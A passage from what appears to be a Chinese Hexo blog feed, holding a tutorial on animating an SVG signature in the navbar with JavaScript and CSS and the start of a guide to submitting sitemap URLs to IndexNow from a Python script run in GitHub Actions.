#CE9178">"M408.451,184.615c.769-1.427,2.085,0,1.316,2.742-1.206,3.621-5.7,8.557-13.933,6.693-1.536,4.937-4.826,9.435-10.311,9.106-5.268-.329-6.7-6.473-6.364-10.423s2.522-12.4,6.143-12.946a5.006,5.006,0,0,1,4.937-4.169c2.853-.22,7.459,3.291,6.693,12.836a12.294,12.294,0,0,1-.219,1.975c3.619,1.426,8.117.988,10.641-3.95Zm-21.943,15.359c2.744.219,5.158-3.62,6.145-7.022a14.8,14.8,0,0,1-6.583-7.789c-1.207.878-3.073,5.7-3.181,7.9C382.778,195.476,382.889,199.755,386.508,199.974Zm4.06-20.626c-1.865.11-2.084,2.743-1.426,4.609a9.361,9.361,0,0,0,4.169,4.936C393.421,184.944,393.2,179.129,390.568,179.348Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-207 -136.305)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">svg</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>仔细观察会发现这种方式得到的 svg 代码是不符合我们的要求（见方法一）的。还需要全选到所有的路径，在属性中将填充设为 none 才行。</p><h3 id="方法三"><a class="markdownIt-Anchor" href="#方法三"></a> 方法三</h3><p>借助在线网站：<a href="https://danmarshall.github.io/google-font-to-svg-path/">Google Font to Svg Path</a> 完成 Svg 的生成。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020507918.png" alt="image-20241102050728816"></p><p>该网站提供<a href="https://fonts.google.com/">谷歌字体</a>供选择，也支持自己上传字体，使用起来是很方便的。</p><p>其中：</p><ul><li>variant：表示你选择的字体的风格 —— 正常还是斜体</li><li> text：输入你要生成 svg 的语句或单词</li><li> union：这个影响 svg 路径，是否要将字母看作整体</li><li> kerning：字距</li><li> separate characters：字符是否分离</li><li> bezier accuracy：跟字体像素有关</li><li> Dxf Units：尺寸单位</li><li> Fill：填充颜色</li><li> Stroke：线条颜色</li><li> Stroke Width：线条宽度</li><li> Non-scaling stroke：是否可缩放</li><li> Fill rule：填充的规则</li></ul><p>参数的变动会实时的更新在下方的 svg 元数据框中。</p><p>这种方法生成的 svg 也是不符合我们的要求（见 fang'fa）的，还需要到能处理 svg 的软件中将它的填充设为 <code>none</code></p><h2 id="编写js"><a class="markdownIt-Anchor" href="#编写js"></a> 编写 js</h2><p>有了上述方法，可以得到 svg 图。这里简单说说我的方案：</p><ul><li>字体：Signerica_Medium</li><li>Google Font to Svg Path：仅 Union 勾选，Size 为 100。其余默认</li><li>待生成文字为：CiaoHello</li></ul><p>当然，还需要到 Adobe Illustrator 中将填充设置成无。</p><p>有了 svg 之后，在 hexo 博客的 <code>source\js</code> 目录下创建 <code>sign.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">navbarBrand</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.container a'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #6A9955">// 替换navbarBrand中的strong标签为svg标签</span></span><span class="line"><span style="color: #9CDCFE">navbarBrand</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">innerHTML</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`</span></span><span class="line"><span style="color: #CE9178">&lt;svg class="svg" viewBox="0 0 682.2 98.507" xmlns="http://www.w3.org/2000/svg"&gt;</span></span><span class="line"><span style="color: #CE9178">...略...</span></span><span class="line"><span style="color: #CE9178">&lt;/svg&gt;</span></span><span class="line"><span style="color: #CE9178">`</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">paths</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.container .navbar-brand .svg path'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #6A9955">// console.log(paths.getTotalLength());</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">len</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">paths</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getTotalLength</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #9CDCFE">paths</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setProperty</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'--l'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">len</span><span style="color: #D4D4D4">)</span></span></code></pre></div></div></figure><h3 id="为什么这么写"><a class="markdownIt-Anchor" href="#为什么这么写"></a> 为什么这么写？</h3><p>这里主要是利用浏览器开发者工具查看你的网站元素结构，找到导航栏的标题位置：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020528928.png" alt="image-20241102052841792"></p><p>可以看到类名为 <code>navbar-brand</code> 的就是导航栏的标题区域，我们就是要将 svg 放在这里。</p><p>上图我已经做出修改，如果没有进行修改的话，你这里的 <code>&lt;svg&gt;</code> 标签应该是依照你的<code>_config.fluid.yml</code> 中设置的导航栏标题也就是 <code>&lt;strong&gt;</code> 标签。</p><p>修改的语句也很简单，先找到父亲 <code>navbarBrand</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">navbarBrand</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.container a'</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>接着使用<code>.innerHTML</code> 设置为 svg 即可：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">navbarBrand</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">innerHTML</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`</span></span><span class="line"><span style="color: #CE9178">&lt;svg class="svg" viewBox="0 0 682.2 98.507" xmlns="http://www.w3.org/2000/svg"&gt;</span></span><span class="line"><span style="color: #CE9178">...略...</span></span><span class="line"><span style="color: #CE9178">&lt;/svg&gt;</span></span><span class="line"><span style="color: #CE9178">`</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>这样只是先将 svg 放在这里了，还需要明白怎么写动画。</p><blockquote><p>可以参考文章：<a href="https://juejin.cn/post/6955857586922979364">https://juejin.cn/post/6955857586922979364</a></p><p>或者视频：<a href="https://www.bilibili.com/video/BV1Qi4y1Y7Sp/">https://www.bilibili.com/video/BV1Qi4y1Y7Sp/</a></p><p>真不是摆烂，大佬讲的是真香</p></blockquote><p>所以现在还需要知道每条 path 的长度，可以使用<code>当前选择的元素.getTotalLength()</code> 得到：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">paths</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.container .navbar-brand .svg path'</span><span style="color: #D4D4D4">) </span><span style="color: #6A9955">// 进一步选择到path</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">len</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">paths</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getTotalLength</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #9CDCFE">paths</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setProperty</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'--l'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">len</span><span style="color: #D4D4D4">)</span></span></code></pre></div></div></figure><p>如果你在之前生成 svg 的时候，生成了多条 path，这里你应该使用的是：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">paths</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelectorAll</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.container .navbar-brand .svg path'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #9CDCFE">paths</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">len</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getTotalLength</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setProperty</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'--l'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">len</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">})</span></span></code></pre></div></div></figure><p>给每条 path 设置上行内样式为变量 <code>--l</code> 方便后面 css 的编写。</p><h2 id="编写css"><a class="markdownIt-Anchor" href="#编写css"></a> 编写 CSS</h2><p>在 <code>source\css</code> 目录下创建 <code>sign.css</code>：</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.svg</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">200pt</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30pt</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.svg</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">path</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">stroke</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">white</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">stroke-width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">3pt</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">stroke-linecap</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">round</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">stroke-dasharray</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--l</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">stroke-dashoffset</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--l</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">fill</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">fill-rule</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">nonzero</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">animation</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">stroke</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">25s</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">forwards</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">-webkit-animation</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">stroke</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">25s</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">forwards</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">@keyframes</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">stroke</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  to {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">stroke-dashoffset</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">/* fill: white; */</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>通过样式变量使得 <code>stroke-dasharray</code> 和 <code>stroke-dashoffset</code> 属性能轻易获取到 path 的长度，也就方便了 <code>@keyframes stroke</code> 的编写。</p><h2 id="另一个方法"><a class="markdownIt-Anchor" href="#另一个方法"></a> 另一个方法</h2><p>其实有个库可以实现这种效果：Vivus.js</p><p>demo：<a href="https://maxwellito.github.io/vivus/">https://maxwellito.github.io/vivus/</a></p><p>GIthub 地址：<a href="https://github.com/maxwellito/vivus">https://github.com/maxwellito/vivus</a></p><p>使用方法也很简单，只要给 svg 标签加上 id 即可：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">svg</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"my-svg"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  &lt;path...&gt;</span></span><span class="line"><span style="color: #D4D4D4">  &lt;path...&gt;</span></span><span class="line"><span style="color: #D4D4D4">  &lt;path...&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">svg</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  new Vivus('my-svg', </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">duration</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">200</span><span style="color: #569CD6">}</span><span style="color: #D4D4D4">, myCallback);</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
            <tag> CSS </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 线条动画 </tag>
            
            <tag> 路径动画 </tag>
            
            <tag> svg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 博客配置 GitHub Actions 推送 indexnow</title>
      <link href="/posts/7648.html"/>
      <url>/posts/7648.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="什么是-indexnow"><a class="markdownIt-Anchor" href="#什么是-indexnow"></a> 什么是 IndexNow？</h2><p>IndexNow 是一种开源协议，可以让网站所有者在网站内容出现变化（添加、更新或删除）后通知搜索引擎，让搜索引擎立即索引这些页面和内容。这使搜索引擎能够在其搜索结果中快速反映这种变化，从而提高整体抓取效率。</p><h2 id="api-key"><a class="markdownIt-Anchor" href="#api-key"></a> API Key</h2><p>找到 <a href="https://www.bing.com/indexnow/getstarted">Indexnow 官网</a>生成 API Key（每点击一次 Generate 都会生成一个新的 Key）：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410272123991.png" alt="image-20241027212339859"></p><h2 id="验证网站所有权"><a class="markdownIt-Anchor" href="#验证网站所有权"></a> 验证网站所有权</h2><p>你需要点击上图中 API Key 右边的下载按钮，将该 <code>5617c6a058f84405b90e2a0c6e99519a.txt</code> 文件保存好。</p><p>然后把它放到你的网站根目录下，让它可以通过网址链接 <code>https://www.example.com/5617c6a058f84405b90e2a0c6e99519a.txt</code> 的形式访问，并得到明文 API Key：<code>5617c6a058f84405b90e2a0c6e99519a</code></p><p>比如，将 <code>5617c6a058f84405b90e2a0c6e99519a.txt</code> 放在 <code>source</code> 目录下，并在<code>_config.yml</code> 中配置 <code>skip_render</code> 如下：</p><figure class="shiki yml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">skip_render</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  - </span><span style="color: #CE9178">"*.py"</span></span><span class="line"><span style="color: #D4D4D4">  - </span><span style="color: #CE9178">"*.txt"</span></span></code></pre></div></div></figure><p>这样可以确保 Hexo 不会尝试渲染这些文件，而只是将它们直接复制到 <code>public</code> 目录。</p><p>这样就做好了第一和第二步。</p><h2 id="github-actions-配置"><a class="markdownIt-Anchor" href="#github-actions-配置"></a> GitHub Actions 配置</h2><p>GitHub 的 Actions 允许你运行一些小文件，我们可以采用 Python 脚本的方式来提交 URLs</p><h3 id="编写提交-urls-的-python-脚本"><a class="markdownIt-Anchor" href="#编写提交-urls-的-python-脚本"></a> 编写提交 URLs 的 Python 脚本</h3><p>我的 Python 文件如下（<code>index_now.py</code>）：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> requests</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> xml.etree.ElementTree </span><span style="color: #C586C0">as</span><span style="color: #D4D4D4"> ET</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">HOST = </span><span style="color: #CE9178">"userName.github.io"</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 替换为你的实际域名</span></span><span class="line"><span style="color: #D4D4D4">KEY = </span><span style="color: #CE9178">"5617c6a058f84405b90e2a0c6e99519a"</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 替换为你的 API Key</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">def</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">get_latest_posts</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">sitemap_path</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">n</span><span style="color: #D4D4D4">=</span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">):</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 解析 XML sitemap</span></span><span class="line"><span style="color: #D4D4D4">    tree = ET.parse(sitemap_path)</span></span><span class="line"><span style="color: #D4D4D4">    root = tree.getroot()</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 使用命名空间</span></span><span class="line"><span style="color: #D4D4D4">    namespaces = {</span><span style="color: #CE9178">'s'</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'http://www.sitemaps.org/schemas/sitemap/0.9'</span><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 获取所有 URL</span></span><span class="line"><span style="color: #D4D4D4">    urls = [(url.find(</span><span style="color: #CE9178">'s:loc'</span><span style="color: #D4D4D4">, namespaces).text, url.find(</span><span style="color: #CE9178">'s:lastmod'</span><span style="color: #D4D4D4">, namespaces).text)</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> url </span><span style="color: #C586C0">in</span><span style="color: #D4D4D4"> root.findall(</span><span style="color: #CE9178">'s:url'</span><span style="color: #D4D4D4">, namespaces)]</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 根据最后修改时间排序</span></span><span class="line"><span style="color: #D4D4D4">    urls.sort(</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">lambda</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">x</span><span style="color: #D4D4D4">: x[</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">], </span><span style="color: #9CDCFE">reverse</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">True</span><span style="color: #D4D4D4">)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 返回最近的 n 个 URL</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> [url[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">] </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> url </span><span style="color: #C586C0">in</span><span style="color: #D4D4D4"> urls[:n]]</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">def</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">ping_bing</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">url_list</span><span style="color: #D4D4D4">):</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># url = 'https://www.bing.com/indexnow'</span></span><span class="line"><span style="color: #D4D4D4">    url = </span><span style="color: #CE9178">'https://api.indexnow.org/IndexNow'</span></span><span class="line"><span style="color: #D4D4D4">    headers = {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">'Content-Type'</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'application/json; charset=utf-8'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 准备数据</span></span><span class="line"><span style="color: #D4D4D4">    data = {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"host"</span><span style="color: #D4D4D4">: HOST,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"key"</span><span style="color: #D4D4D4">: KEY,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"keyLocation"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">f</span><span style="color: #CE9178">"https://</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">HOST</span><span style="color: #569CD6">}</span><span style="color: #CE9178">/</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">KEY</span><span style="color: #569CD6">}</span><span style="color: #CE9178">.txt"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"urlList"</span><span style="color: #D4D4D4">: url_list</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955"># 发送 POST 请求</span></span><span class="line"><span style="color: #D4D4D4">    response = requests.post(url, </span><span style="color: #9CDCFE">headers</span><span style="color: #D4D4D4">=headers, </span><span style="color: #9CDCFE">json</span><span style="color: #D4D4D4">=data)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> response</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">__name__</span><span style="color: #D4D4D4"> == </span><span style="color: #CE9178">"__main__"</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    sitemap_path = </span><span style="color: #CE9178">"sitemap.xml"</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 替换为你的 sitemap 文件路径</span></span><span class="line"><span style="color: #D4D4D4">    url_list = get_latest_posts(sitemap_path, </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">)  </span><span style="color: #6A9955"># 获取最近 10 篇文章的 URL</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">print</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"最近更新的文章 URL 列表："</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">print</span><span style="color: #D4D4D4">(url_list)  </span><span style="color: #6A9955"># 打印获取的 URL 列表</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    response = ping_bing(url_list)  </span><span style="color: #6A9955"># 向 IndexNow 发送请求</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">print</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"响应状态码："</span><span style="color: #D4D4D4">, response.status_code)  </span><span style="color: #6A9955"># 打印响应状态</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">print</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"响应内容："</span><span style="color: #D4D4D4">, response.text)  </span><span style="color: #6A9955"># 打印响应内容</span></span></code></pre></div></div></figure><p>脚本值得注意的点在于：</p><ol><li><code>HOST = "userName.github.io"</code></li><li><code>KEY = "5617c6a058f84405b90e2a0c6e99519a"</code></li><li><code>sitemap_path = "sitemap.xml"</code></li></ol><p>前面两个主要是配置成你自己的就行。</p><p>主要是第三个 sitemap 路径问题，我建议安装 <code>hexo-generator-sitemap</code> 插件，该插件在每次 <code>hexo g</code> 生成文件时<strong>重新生成</strong>新的 <code>sitemap.xml</code> 文件并放置在 <code>public</code> 目录下，这会使得它被推送时放置在仓库根目录下，符合我脚本的要求。</p><p>脚本编写好后，同样需要将其推送到仓库，我的是根目录。我将脚本同样放在 <code>source</code> 目录下，这样它会和 